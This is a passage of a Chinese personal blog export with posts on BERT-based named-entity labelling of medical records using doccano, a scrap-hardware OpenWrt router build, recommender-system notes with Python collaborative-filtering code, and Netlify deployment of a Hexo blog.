<p>一些医院的电子病历拆分的很细，比如主诉这一个大项里面部位、症状、时间、状态都是分开的；另一些医院的电子病历就跟纯文本差不多，要把大段文字中的主要结构提出来需要自然语言处理或者人工录入。一般做自然语言处理的时候都是几个部分分开做的，因为不同部分差异比较大，分开训练识别效果好。大部分电子病历包括入院记录、首次病程记录、病程记录、出院记录、手术记录、护理记录、病案首页，这里面又分为一些检查项、时间、主诉、既往史之类的小项。不少电子病历系统导出都是XML的，一般都是把电子病历拆成主诉那种一个个不能再拆的纯文本部分，比如主诉，见<a href="https://zhangjk98.xyz/81d4/">上一篇</a>，然后再对不能拆分的纯文本用人工或自然语言处理进一步拆分。这就是所谓的电子病历结构化。</p>
<p>比如一段主诉：</p>
<blockquote>
<p>反复胸痛伴胸闷1+年，加重20+天。</p>
</blockquote>
<p>按照规范一定的规范可分为几个不同的小块，比如下面这十一种：</p>
<blockquote>
<p>部位、症状、持续时间、伴随部位、伴随症状、伴随时间、状 态、病因/其他、观察项目、观察结果、既往史</p>
</blockquote>
<p>胸是部位、痛是症状、1+年是持续时间、反复是状态......</p>
<p>标注出来的结果可以保存为json格式，labels里面的list分别为起始位置、结束位置、标签</p>
<pre class="line-numbers language-none"><code class="language-none">
&#123;&quot;text&quot;: &quot;反复胸痛伴胸闷1+年，加重20+天。&quot;, &quot;labels&quot;: [[0, 2, &quot;状态&quot;], [2, 3, &quot;部位&quot;], [3, 4, &quot;症状&quot;], [5, 7, &quot;伴随症状&quot;], [7, 10, &quot;伴随时间&quot;], [11, 17, &quot;持续时间&quot;]]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>BIO格式，大概是这个样子：B，begin标签开始；I，inside包含在标签内，O，outside在标签外</p>
<pre class="line-numbers language-none"><code class="language-none">
反 B-状态
复 I-状态
胸 B-部位
痛 B-症状
伴 O
胸 B-伴随症状
闷 I-伴随症状
1 B-伴随时间
+ I-伴随时间
年 I-伴随时间
， O
加 B-持续时间
重 I-持续时间
2 I-持续时间
0 I-持续时间
+ I-持续时间
天 I-持续时间
。 O<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>BERT的接口是BIO格式，标注工具doccano，这里写两个互相转换的脚本就行了，标注完成后将json转为BIO，训练和预测完成后将BIO预测结果转为JSON</p>
<h2 id="训练模型">训练模型</h2>
<p>NLP里面的命名实体识别很早就用在电子病历上，早期的机器学习方法效果一般，后来开始用RNN和CNN，后来用LSTM，再后来用BERT，效果一直在提升，BERT基本上到顶了（好一点的训练数据BERT基本能达到90%以上，对于主诉这样的较短的简单条目甚至能达到98%以上）</p>
<h2 id="其他杂项">其他杂项</h2>
<h3 id="doccano的部署和使用">doccano的部署和使用</h3>
<h4 id="部署">部署</h4>
<h5 id="docker方式">Docker方式</h5>
<h6 id="构建和部署">构建和部署</h6>
<p>运行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">
$ docker pull chakkiworks&#x2F;doccano # 拉取官方镜像
$ docker run -d --name doccano -p 80:8000 chakkiworks&#x2F;doccano # 运行镜像，请按需修改端口
$ docker exec doccano tools&#x2F;create-admin.sh &quot;admin&quot; &quot;[email protected]&quot; &quot;password&quot; # 创建用户并指定密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>注意 Docker镜像run之后会产生三个容器，doccona_nginx、doccona_backend、docker_frontend,其中docker_frontend在构建完成后会直接exit，这是一个feature，不是bug，它的主要作用是webpack打包</p>
<figure>
<img src="/9112/image-20200109220759931.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
</blockquote>
<h4 id="访问docker中的postgresql数据库中的数据">访问Docker中的PostgreSQL数据库中的数据</h4>
<p>由于数据库安全问题，数据库分离再一个单独的容器中并且 首先执行<code>Docker exec</code>命令进入相应的PostgreSQL数据库容器</p>
<p>应该看到下图这样，终端从宿主机切换进容器</p>
<figure>
<img src="/9112/image-20200109220232851.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>在容器的shell中用命令进入数据库</p>
<pre class="line-numbers language-none"><code class="language-none">
$ psql -h 127.0.0.1 -d doccano -U doccano -p 5432 # 注意你的host，数据库名、用户名和端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>应该看到下图这样，终端从Docker容器切进数据库</p>
<figure>
<img src="/9112/image-20200109220100751.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>然后执行<code>\l</code>等命令进入和查看数据库（执行SQL）</p>
<h4 id="使用">使用</h4>
<p>后台管理入口是这个http://yoursite/admin/，就是一个Django自带的后台管理</p>
<figure>
<img src="/9112/image-20200411204841203-1586654887394.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<figure>
<img src="/9112/image-20200411205005107-1586654884937.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<figure>
<img src="/9112/image-20200411205102588-1586654882966.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>登录进去后可自行添加账号和项目并设置权限和标签，标注项目选择sequential labeing即可，导出时选择JSONL格式</p>
<p>这个数据比较多的时候没有自动跳转比较麻烦，请直接在浏览器地址栏使用url跳转</p>
<p>比如，修改浏览器后面的url，#后面的offset改为685，直接回车，就可以从当前的689跳转到第685个数据</p>
<p>http://yoursite/projects/6/#offset=685</p>
<figure>
<img src="/9112/image-20200307213544539.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="注">注</h2>
<p>https://github.com/doccano/doccano 一个开源的标注工具</p>
<p>https://github.com/macanv/BERT-BiLSTM-CRF-NER 一个BERT的NER工具包</p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>bert</tag>
        <tag>NER</tag>
      </tags>
  </entry>
  <entry>
    <title>垃圾佬的Openwrt软路由</title>
    <url>/openwrt/</url>
    <content><![CDATA[<p>又是捡垃圾的快乐一天 <a id="more"></a></p>
<h2 id="材料">材料</h2>
<h3 id="教研室捡来的垃圾">教研室捡来的垃圾</h3>
<blockquote>
<p>又不是不能用</p>
</blockquote>
<ul>
<li>2GB 内存条（看起来全新实际上至少八九年前的了，别问为什么只有2G，这是教研室能捡垃圾捡到的最后一块内存条了）</li>
<li>120G intel固态（包浆成色，上个月刚从一个旧电脑上拆下来的）</li>
<li>一块 i5 4570 的CPU（战斗成色，貌似也六年了）</li>
<li>一个风扇（战损成色，全是灰）</li>
<li>六七年前的华硕主板（伊拉克战损成色）</li>
<li>一个三星显示器（屏幕漏光，也有五六年了，装系统临时用一下）</li>
<li>一个2014年的老机箱（战斗成色，全是灰）</li>
<li>一个主机电源（不是很新，200W）</li>
<li>VGA线、电源线、排线（普通成色）</li>
<li>螺丝等（一大把旧主机上拆下来的）</li>
<li>键盘（N年前的薄膜，伊拉克战损成色，全是灰）</li>
</ul>
<p>对，102网吧的主板就是这样子的战损主板</p>
<figure>
<img src="/openwrt/image-20201030191635951.webp" alt="对，只有这种主板了" /><figcaption aria-hidden="true">对，只有这种主板了</figcaption>
</figure>
<h3 id="全新的和自掏腰包的">全新的和自掏腰包的</h3>
<p>基本都是室友出的钱</p>
<ul>
<li>螺丝刀等（全新，室友的）</li>
<li>一个插排（昨天室友买的）</li>
<li>硅脂（全新）</li>
<li>网卡（室友网购的，刚到）</li>
<li>网线（教研室网线太老了，就不捡垃圾了）</li>
<li>clash和v2ray订阅，机场买的</li>
</ul>
<h2 id="刷机">刷机</h2>
<p>自行编译时间太长就用人家编译好的了, 室友刷的。本来以为可能2G的老内存可能会卡，结果室友的win10 pe上去意外的流畅。</p>
<p>借用了这个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xvbW90SG8vVUVTVEMtTmV0d29ya0F1dG9Db25uZWN0">电子科技大学校园网自动登陆脚本<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一点小插曲">一点小插曲</h2>
<p>晚上室友买完插排，第二天我发现教研室的一个旧箱子里满满一箱子插排，好家伙，亏了一个亿。</p>
<figure>
<img src="/openwrt/image-20201030191838215.webp" alt="这么多插排...." /><figcaption aria-hidden="true">这么多插排....</figcaption>
</figure>
<p>本来Openclash都整好了，结果发现室友的安卓电报没法自行分流。换成了 ssr plus</p>
<p>装好之后发现风扇声音有点大........直接把风扇线拔了，世界终于清净了。至于散热，问题不大（这么点负载总不可能把CPU给烧了）。</p>
<p>ps. 正确的做法是SSH上去</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fanspeedctl stop --all --now<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>固态闲置了100多个G</p>
<h2 id="突然发现了clash的正确使用方式">突然发现了clash的正确使用方式</h2>
<p>之前一直很不喜欢clash，clash for win10的图形界面操作在我看起来特别反人类，安卓和平板上clash的app耗电惊人。自动切换线路和分流对我来说又没什么用，一直觉得clash鸡肋，不知道为什么这么多人都在说clash香。</p>
<p>直到今天室友带入坑上了软路由，好家伙，自动分流和切换真香</p>
<p>clash这种就适合软路由或者台式机什么的，手机和平板耗电根本顶不住，挂在后台掉电太快了</p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>openwrt</tag>
        <tag>捡垃圾</tag>
      </tags>
  </entry>
  <entry>
    <title>推荐系统笔记</title>
    <url>/bccd/</url>
    <content><![CDATA[<p>等待填坑 <a id="more"></a> 大概分为用户建模模块、推荐对象建模模块、推荐算法模块</p>
<h2 id="主要算法">主要算法</h2>
<h3 id="协同过滤算法">协同过滤算法</h3>
<p>最老最经典的一个算法了，大概是给用户推荐兴趣和关注点相似用户的感兴趣内容。</p>
<p>协同过滤有基于领域的方法(neighborhood methods)和隐语义模型(latent factor models)，基于图的随机游走算法(random walk on graph) 下面两个是基于邻域的方法：</p>
<h4 id="基于物品的协同过滤">基于物品的协同过滤</h4>
<p>（item-based collaborative filtering，ItemCF） 找到物品之间的属性关联，向用户推荐属性相似的物品 设N(i)是喜欢i物品的用户数 相似度：</p>
<p><span class="math display">\[w_{ij}=\frac{|N(i)\cap N(j)|}{|N(j)|}\]</span></p>
<p>避免热门物品干扰，改为</p>
<p><span class="math display">\[w_{ij}=\frac{|N(i)\cap N(j)|}{\sqrt{|N(j)||N(i)|}}\]</span></p>
<h4 id="基于用户的协同过滤">基于用户的协同过滤</h4>
<p>（User-based collaborative filtering，UserCF） 找到和用户相似的其他用户，将其他用户感兴趣的产品推荐给用户。还有一种是“购买过XXX等用户也XXX”，算是这个方法的一个变种</p>
<p>计算相似度，N(u)是用户正反馈的集合，N(v)是用户负反馈物品的集合 Jaccard相似度：</p>
<p><span class="math display">\[w_{u,v}= \frac{|N(u)\cap N(v)|}{|N(u)\cup N(v)|}\]</span></p>
<p>余弦相似度：</p>
<p><span class="math display">\[w_{u,v}= \frac{|N(u)\cap N(v)|}{\sqrt{|N(u)||N(v)|}}\]</span></p>
<h2 id="冷启动问题">冷启动问题</h2>
<p>等待填坑，利用用户注册信息，人工标注等</p>
<h2 id="大众行为个性化推荐">大众行为/个性化推荐</h2>
<p>等待填坑</p>
<h2 id="imdb电影评论推荐例子">imdb电影评论推荐例子</h2>
<p>这里使用<span class="exturl" data-url="aHR0cDovL2ZpbGVzLmdyb3VwbGVucy5vcmcvZGF0YXNldHMvbW92aWVsZW5zLw==">movielens数据集<i class="fa fa-external-link-alt"></i></span>， 数据集的rating.csv包括用户id，物品id，评分，评论时间。(这个csv文件第一行是userid，movieid，·····，把第一行直接删掉或者从第二行开始读取，不然会报TypeError: unsupported operand type(s) for -: 'str' and 'int'的错) 使用的算法是SVD矩阵分解。构建一个用户-物品矩阵，每一项的值是评分，这是一个极其稀疏的矩阵 我们导入数据集并分割：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">header <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">,</span> <span class="token string">'item_id'</span><span class="token punctuation">,</span> <span class="token string">'rating'</span><span class="token punctuation">,</span> <span class="token string">'timestamp'</span><span class="token punctuation">]</span>  <span class="token comment"># 用户id，物品id，评分，评论时间</span>

df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'../data/u.data'</span><span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">'\t'</span><span class="token punctuation">,</span> names<span class="token operator">=</span>header<span class="token punctuation">)</span>
n_users <span class="token operator">=</span> df<span class="token punctuation">.</span>user_id<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#用户数量</span>
n_items <span class="token operator">=</span> df<span class="token punctuation">.</span>item_id<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#物品数量</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Number of users = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n_users<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' | Number of movies = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 数据集分割——训练集：测试集 = 3:1</span>
train_data<span class="token punctuation">,</span>test_data <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>df<span class="token punctuation">,</span> test_size <span class="token operator">=</span> <span class="token number">0.25</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>建立评分矩阵 <pre class="line-numbers language-python" data-language="python"><code class="language-python">train_data_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>n_users<span class="token punctuation">,</span> n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
test_data_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>n_users<span class="token punctuation">,</span> n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#使用 pandas 遍历行数据</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> train_data<span class="token punctuation">.</span>itertuples<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#训练集评分矩阵</span>
    train_data_matrix<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> test_data<span class="token punctuation">.</span>itertuples<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#测试集评分矩阵</span>
    test_data_matrix<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>计算余弦相似度：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">user_similarity <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> metric <span class="token operator">=</span> <span class="token string">"cosine"</span><span class="token punctuation">)</span>  <span class="token comment"># 计算余弦距离</span>
item_similarity <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">.</span>T<span class="token punctuation">,</span> metric <span class="token operator">=</span> <span class="token string">"cosine"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>基于用户和基于物品的协同过滤</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span>rating<span class="token punctuation">,</span> similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'user'</span><span class="token punctuation">:</span>
        <span class="token comment"># </span>
        mean_user_rating <span class="token operator">=</span> rating<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>axis <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#mean函数：压缩列，对各行求均值，返回 m *1 矩阵</span>
        <span class="token comment"># print(mean_user_rating)</span>
        rating_diff <span class="token operator">=</span> <span class="token punctuation">(</span>rating <span class="token operator">-</span> mean_user_rating<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">]</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> mean_user_rating<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">]</span> <span class="token operator">+</span> similarity<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>rating_diff<span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>similarity<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>T
        <span class="token comment">#dot函数：矩阵相乘；np.abs()：矩阵元素的绝对值  .T:转置</span>
        <span class="token comment"># print('test',pred.min())</span>
    <span class="token keyword">elif</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'item'</span><span class="token punctuation">:</span>
        pred <span class="token operator">=</span> rating<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>similarity<span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>similarity<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token comment"># print('test2',pred.max())</span>
    <span class="token keyword">return</span> pred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">item_prediction <span class="token operator">=</span> predict<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> item_similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'item'</span><span class="token punctuation">)</span>
user_prediction <span class="token operator">=</span> predict<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> user_similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>item_prediction<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>item_prediction<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>argsort<span class="token punctuation">(</span>item_prediction<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>计算均方误差 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rmse</span><span class="token punctuation">(</span>prediction<span class="token punctuation">,</span> ground_truth<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 计算均方误差</span>
    <span class="token comment">#nonzero(a)返回数组a中值不为零的元素的下标</span>
    <span class="token comment">#flatten()创建矩阵</span>
    prediction <span class="token operator">=</span> prediction<span class="token punctuation">[</span>ground_truth<span class="token punctuation">.</span>nonzero<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ground_truth <span class="token operator">=</span> ground_truth<span class="token punctuation">[</span>ground_truth<span class="token punctuation">.</span>nonzero<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> sqrt<span class="token punctuation">(</span>mean_squared_error<span class="token punctuation">(</span>prediction<span class="token punctuation">,</span> ground_truth<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'User based CF RMSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>user_prediction<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Item based CF RMSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>item_prediction<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>SVD分解的方法，其中k是特征值个数，指定将分解为<span class="math inline">\(m*k\)</span>和<span class="math inline">\(k*n\)</span>，中间的对角矩阵有k个特征值 &gt;k: int, optional,Number of singular values and vectors to compute. Must be 1 &lt;= k &lt; min(A.shape)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">u<span class="token punctuation">,</span> s<span class="token punctuation">,</span> vt <span class="token operator">=</span> svds<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span>
s_diag_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>diag<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
X_pred <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>u<span class="token punctuation">,</span> s_diag_matrix<span class="token punctuation">)</span><span class="token punctuation">,</span> vt<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'User-based CF MSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>X_pred<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>参考</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sdW1pbmdkb25nLmNuL3JlY29tbWVuZGF0aW9uLWFsZ29yaXRobS1iYXNlZC1vbi1tYXRyaXgtZGVjb21wb3NpdGlvbi5odG1s">基于矩阵分解的推荐算法<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FjeW1reHljL1JlY1N5cw==">项亮的《推荐系统实践》的代码实现<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>推荐系统</tag>
      </tags>
  </entry>
  <entry>
    <title>试用Netlify自动部署和CMS</title>
    <url>/e9d5/</url>
    <content><![CDATA[<p>又开始了瞎折腾。话说我这种没人看的静态小破网站，真的有必要持续集成、持续部署吗？</p>
<a id="more"></a>
<h2 id="使用netlify进行自动化部署">使用Netlify进行自动化部署</h2>
<p>不知道怎么都在搞CI/CD（Continuous Integration/Continuous Deployment），Github也搞了个Github Action。看了一圈感觉对于我这种半个月git commit一次备份博客的人并没有什么必要，而且不管是travis ci还是github action或netlify自己的在线build都很慢，博客东西多一点几分钟就过去了（没有特殊需求就想安安静静写个博客就不要搞这个了，本地hexo g，hexo d推到github pages或者netlify就完事了，速度还快）</p>
<p>之前都是在本地生成，hexo g &amp;&amp; hexo d 推到Github pages，然后Netlify关联这个仓库自动拉取(好像是用的钩子吧)。备份的时候再 git commit &amp;&amp; git push 本地项目。 现在每次 git commit 备份并 git push，让Netlify从Hexo的项目直接在线 Hexo g ，按部就班授权，改仓库，改deploy命令为 hexo clean &amp;&amp; hexo generate 结果直接Deploy failed了 报错:</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">failed during stage &#39;preparing repo&#39;: Error checking out submodules: fatal: No url found for submodule path &#39;themes&#x2F;next&#39; in .gitmodules<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查了一下发现是Netlify会把每一个包含.git的子目录当成是一个submodule，并且每次都要<code>git submodule update</code>一下，但是这个next主题的git仓库又没有在在我的.gitmodules配置里面设置为submodule, 那我们直接把themes/next加到.gitmodules里面就好了<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
<p>在根目录（执行hexo g &amp;&amp; hexo d的那个目录）新建<code>.gitmodules</code>写入</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">[submodule &quot;themes&#x2F;next&quot;]
	path &#x3D; themes&#x2F;next
	url &#x3D; https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>再执行就行了(先<code>git commit</code>,再<code>git push</code>,再进Netlify试一下)</p>
<p>看到Deploy log：</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">4:46:21 PM: Minifying js bundle
4:46:22 PM: Minifying css bundle
4:46:23 PM: Minifying css bundle
4:46:36 PM: Finished processing build request in 56.658478141s
4:46:37 PM: Post processing done
4:46:37 PM: Site is live<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>行了，速度还是可以的，build过程56秒（虽然本地只要几秒，Hugo之类的更快） 对比一下本地</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">INFO  Files loaded in 3.96 s
···
INFO  180 files generated in 2.01 s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这个速度可以接受，据说Netlify最近新增了CI的时间限制（官网说是300 included/month，每个月三百分钟），但是我这种不是重度用户的人根本用不完（实在不行本地hexo s调试好了再提交就完事了，Netlify也要恰饭的嘛，每次CI都要重新安装环境） 带宽也有限制，100GB，我这个没人看的小破博客也根本用不了。</p>
<p>还有一个小问题，改成这样之后发现每一篇文章的更新时间都变成了今天，暂时还没找到判定更新时间的原理是什么，一个办法是手动指定时间戳 在每个markdown文件开头</p>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">updated: '2019-11-30 20:22:52'
date: '2019-11-30 20:22:52'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>更新，找到了这个时间戳的问题，看这个issue：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2lzc3Vlcy84OTM=">The update time of the article is incorrect<i class="fa fa-external-link-alt"></i></span></p>
<p>大概是Git在checkout的时候，没有正确保留时间戳，试了一下，应该就是push上去的时间，而不是修改后add的时间或者commit的时间</p>
<blockquote>
<p>It uses the push time of the last modification of the file.</p>
</blockquote>
<p>根据issue里的解决办法，只要在<code>hexo clean &amp;&amp; hexo generate</code> 之前加上<code>git ls-files -z | while read -d '' path; do touch -d \"$(git log -1 --format=\"@%ct\" \"$path\")\" \"$path\"; done</code>就行了</p>
<p>算了，直接关了吧</p>
<h2 id="netlify-cms-使用">Netlify CMS 使用</h2>
<p>（多说一句，Netlify官网打开是真的慢啊） 我已经踩过坑了，没有他们吹的那么好，大骗子，这个也就手机/平板写markdown和发布可以将就一下，真的都不如随身带个U盘里面装着博客工程或者markdown体验好 如果不是有多人协作之类的需求就不要乱试了（除非你真的吃饱了撑的没事干</p>
<p>如果你还是要安装：</p>
